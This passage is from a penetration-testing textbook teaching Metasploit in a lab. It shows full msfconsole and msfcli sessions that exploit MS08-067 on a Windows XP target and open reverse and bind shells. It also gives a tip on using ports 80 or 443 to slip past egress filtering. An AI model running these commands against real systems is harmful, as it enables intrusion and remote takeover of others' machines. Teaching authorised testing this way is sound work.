Payloads (or shellcode)
Based on the output of show options command, it looks like everything should
be ready to go at this point, but we’re not quite done yet. We’ve forgotten to
tell our exploit what to do once the target has been exploited. One of the
ways that Metasploit makes things easier is by setting up our payloads for us.
Metasploit has a plethora of payloads, ranging from simple Windows com-
mands to the extensible Metasploit Meterpreter (see Chapter 13 for more
detailed information on Meterpreter). Just select a compatible payload, and
Metasploit will craft your exploit string, including the code to trigger the
vulnerability and the payload to run after exploitation is successful. (We’ll
look at writing exploits by hand in Chapters 16 through 19.)
Finding Compatible Payloads
As of this writing there were 324 payloads in Metasploit, and like exploit
modules, new payloads are added to the Framework regularly. For instance,
as mobile platforms take over the world, payloads for iOS and other smart-
phones are starting to show up in Metasploit. But, of course, not all 324 pay-
loads are compatible with our chosen exploit. Our Windows system will be a
bit confused if it receives instructions that are meant for an iPhone. To see
compatible payloads, enter show payloads, as shown in Listing 4-7.
msf exploit(ms08_067_netapi) > show payloads
Compatible Payloads
===================
Name Disclosure Date Rank Description
---- --------------- ---- -----------
generic/custom normal Custom Payload
generic/debug_trap normal Generic x86 Debug Trap
generic/shell_bind_tcp normal Generic Command Shell, Bind TCP
Inline
96 Chapter 4
generic/shell_reverse_tcp normal Generic Command Shell, Reverse
Inline
generic/tight_loop normal Generic x86 Tight Loop
windows/dllinject/bind_ipv6_tcp normal Reflective DLL Injection, Bind
TCP Stager (IPv6)
windows/dllinject/bind_nonx_tcp normal Reflective DLL Injection, Bind
TCP Stager (No NX or Win7)
windows/dllinject/bind_tcp normal Reflective DLL Injection, Bind
TCP Stager
windows/dllinject/reverse_http normal Reflective DLL Injection, Reverse
HTTP Stager
--snip--
windows/vncinject/reverse_ipv6_http normal VNC Server (Reflective Injection),
Reverse HTTP Stager (IPv6)
windows/vncinject/reverse_ipv6_tcp normal VNC Server (Reflective Injection),
Reverse TCP Stager (IPv6)
--snip--
windows/vncinject/reverse_tcp normal VNC Server (Reflective Injection),
Reverse TCP Stager
windows/vncinject/reverse_tcp_allports normal VNC Server (Reflective Injection),
Reverse All-Port TCP Stager
windows/vncinject/reverse_tcp_dns normal VNC Server (Reflective Injection),
Reverse TCP Stager (DNS)
Listing 4-7: Compatible payloads
If you forget to set a payload, you may find that, miraculously, the exploit
module will just choose the default payload and associated settings and run
it anyway. Still, you should get in the habit of manually setting a payload and
its options because the default won’t always fit your needs.
A Test Run
Let’s keep things simple and send off our exploit with the default payload
options first, just to see how things work. Enter exploit to tell Metasploit to
run the module, as shown in Listing 4-8.
msf exploit(ms08_067_netapi) > exploit
[*] Started reverse handler on 192.168.20.9:4444
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1334) at
2015-08-31 07:37:05 -0400
meterpreter >
Listing 4-8: Running the exploit
Using the Metasploit Framework 97
As you can see, we end up with a Meterpreter session. Meterpreter is
short for meta-interpreter, Metasploit’s unique payload. I often describe it as
a shell on steroids. It can do everything a command shell can do and much,
much more. We’ll cover Meterpreter in depth in Chapter 13, but to get a
head start, enter help in the Meterpreter console for a list of Meterpreter’s
commands.
note Another thing to note about the default options is that Metasploit uses the port 4444.
In our lab there is nothing wrong with this. It will work just fine. However, on real
engagements, if your client is using even primitive intrusion-prevention software, it
may take note of traffic on port 4444 and say, “Hey, you are Metasploit, go away!”
and drop your connection.
For now, let’s close our Meterpreter session and learn more about select-
ing payloads manually. As useful as Meterpreter is, you may find yourself
in situations where it is not the ideal payload to meet your needs. Type exit
into your Meterpreter prompt to return to the regular Metasploit console.
meterpreter > exit
[*] Shutting down Meterpreter...
[*] Meterpreter session 1 closed. Reason: User exit
msf exploit(ms08_067_netapi) >
types of shells
In the list of compatible payloads shown in Listing 4-7, you see a range of
options including command shells, Meterpreter, a speech API, or execution
of a single Windows command. Meterpreter or otherwise, shells fall into two
categories: bind and reverse.
Bind Shells
A bind shell instructs the target machine to open a command shell and listen
on a local port. The attack machine then connects to the target machine on
the listening port. However, with the advent of firewalls, the effectiveness
of bind shells has fallen because any correctly configured firewall will block
traffic to some random port like 4444.
Reverse Shells
A reverse shell, on the other hand, actively pushes a connection back to the
attack machine rather than waiting for an incoming connection. In this
case, on our attack machine we open a local port and listen for a connec-
tion from our target because this reverse connection is more likely to make
it through a firewall.
98 Chapter 4
note You may be thinking, “Was this book written in 2002 or something? My firewall has
egress filtering.” Modern firewalls allow you to stop outbound connections as well as
inbound ones. It would be trivial to stop a host in your environment from connecting
out, for instance, to port 4444. But say I set up my listener on port 80 or port 443.
To a firewall, that will look like web traffic, and you know you have to let your users
look at Facebook from their workstations or there would be mutiny and pandemonium
on all sides.
setting a Payload manually
Let’s select a Windows reverse shell for our payload. Set a payload the same
way you set the RHOST option: set payload .
msf exploit(ms08_067_netapi) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp
Because this is a reverse shell, we need to tell the target where to
send the shell; specifically, we need to give it the IP address of the attack
machine and the port we will listen on. Running show options again, shown
in Listing 4-9, displays the module as well as the payload options.
msf exploit(ms08_067_netapi) > show options
Module options (exploit/windows/smb/ms08_067_netapi):
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST 192.168.20.10 yes The target address
RPORT 445 yes Set the SMB service port
SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)
Payload options (windows/shell_reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
EXITFUNC thread yes Exit technique: seh, thread, process, none
uLHOST yes The listen address
LPORT 4444 yes The listen port
Exploit target:
Id Name
-- ----
0 Automatic Targeting
Listing 4-9: Module options with a payload
Using the Metasploit Framework 99
LHOST u is our local host on the Kali machine, the IP address we want
our target machine to connect back to. To find the IP address (if you have
forgotten it), enter the Linux ifconfig command directly into Msfconsole.
msf exploit(ms08_067_netapi) > ifconfig
[*] exec: ifconfig
eth0 Link encap:Ethernet HWaddr 00:0c:29:0e:8f:11
inet addr:192.168.20.9 Bcast:192.168.20.255 Mask:255.255.255.0
--snip--
Now set the LHOST option with set LHOST 192.168.20.9. Leave the defaults
for LPORT, for the local port to connect back to, as well as for EXITFUNC, which
tells Metasploit how to exit. Now enter exploit, shown in Listing 4-10, to
send our exploit off again, and wait for the shell to appear.
msf exploit(ms08_067_netapi) > exploit
[*] Started reverse handler on 192.168.20.9:4444 u
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX) v
[*] Attempting to trigger the vulnerability...
[*] Command shell session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1374)
at 2015-08-31 10:29:36 -0400
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>
Listing 4-10: Running the exploit
Congratulations: You have successfully exploited your first machine!
Here’s what happened. When we enter exploit, Metasploit opens a lis-
tener on port 4444 to catch the reverse shell from the target u. Then, since
we kept the target as the default Automatic Targeting, Metasploit finger printed
the remote SMB server and selected the appropriate exploit target for us v.
Once it selected the exploit, Metasploit sent over the exploit string and
attempted to take control of the target machine and execute our selected
payload. Because the exploit succeeds, a command shell was caught by our
handler.
To close this shell, type ctrl-C and enter y at the prompt to abort the
session.
C:\WINDOWS\system32>^C
Abort session 2? [y/N] y
[*] Command shell session 2 closed. Reason: User exit
msf exploit(ms08_067_netapi) >
100 Chapter 4
To return to a Meterpreter shell, you can choose a payload with
Meterpreter in the name such as windows/meterpreter/reverse_tcp and
exploit the Windows XP target again.
msfcli
Now for another way to interact with Metasploit: the command line inter-
face, Msfcli. Msfcli is particularly useful when using Metasploit inside scripts
and for testing Metasploit modules that you’re developing because it lets
you run a module with a quick, one-line command.
Getting Help
To run Msfcli, first exit Msfconsole by entering exit, or just open another
Linux console. Msfcli is in our path, so we can call it from anywhere. Let’s
begin by looking at the help menu for Msfcli with msfcli -h (Listing 4-11).
root@kali:~# msfcli -h
u Usage: /opt/metasploit/apps/pro/msf3/msfcli   [mode]
==============================================================================
Mode Description
---- -----------
(A)dvanced Show available advanced options for this module
(AC)tions Show available actions for this auxiliary module
(C)heck Run the check routine of the selected module
(E)xecute Execute the selected module
(H)elp You're looking at it baby!
(I)DS Evasion Show available ids evasion options for this module
v(O)ptions Show available options for this module
w(P)ayloads Show available payloads for this module
(S)ummary Show information about this module
(T)argets Show available targets for this exploit module
Listing 4-11: Msfcli help
Unlike with Msfconsole, when using Msfcli, we can tell Metasploit every-
thing it needs to know to run our exploit in just one command u. Luckily,
Msfcli has some modes to help us build the final command. For example,
the O mode v shows the selected module’s options, and P shows the compat-
ible payloads w.
Showing Options
Let’s use our MS08-067 exploit against our Windows XP target again.
According to the help page, we need to pass Msfcli the exploit name we
want to use and set all our options u. To show the available options use
the O mode. Enter msfcli windows/smb/ms08_067_netapi O to see the options
for the MS08-067 exploit module, as shown in Listing 4-12.
Using the Metasploit Framework 101
root@kali:~# msfcli windows/smb/ms08_067_netapi O
[*] Please wait while we load the module tree...
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 445 yes Set the SMB service port
SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)
Listing 4-12: Module options
We see the same options as we did in Msfconsole. We’re reminded to
set the RHOST option to the IP address of the target machine, but as we saw
on the help page, setting options in Msfcli is a little different from doing do
in Msfconsole. Here we say option=value. For example, to set RHOST, we enter
RHOST=192.168.20.10.
Payloads
For a reminder of the payloads compatible with this module, use the P mode.
Try msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P, as shown in
Listing 4-13.
root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P
[*] Please wait while we load the module tree...
Compatible payloads
===================
Name Description
---- -----------
generic/custom Use custom string or file as payload. Set
either PAYLOADFILE or PAYLOADSTR.
generic/debug_trap Generate a debug trap in the target process
generic/shell_bind_tcp Listen for a connection and spawn a command
shell
generic/shell_reverse_tcp Connect back to attacker and spawn a command
shell
generic/tight_loop Generate a tight loop in the target process
--snip--
Listing 4-13: Module payloads in Msfcli
This time, we’ll use a bind shell payload. Recall that a bind shell just
listens on a local port on the target machine. It will be up to our attack
machine to connect to the target machine after the payload has run. Recall
from our work in Msfconsole that choosing a payload requires additional
payload-specific options, which we can view again with the O flag.
Because our bind shell won’t be calling back to our attack machine, we
don’t need to set the LHOST option, and we can leave the LPORT option as the
102 Chapter 4
default of 4444 for now. It looks like we have everything we need to exploit
the Windows XP target again. Finally, to tell Msfcli to run the exploit we
use the E flag (Listing 4-14).
root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10
PAYLOAD=windows/shell_bind_tcp E
[*] Please wait while we load the module tree...
RHOST => 192.168.20.10
PAYLOAD => windows/shell_bind_tcp
[*] Started bind handler u
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Command shell session 1 opened (192.168.20.9:35156 -> 192.168.20.10:4444)
at 2015-08-31 16:43:54 -0400
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>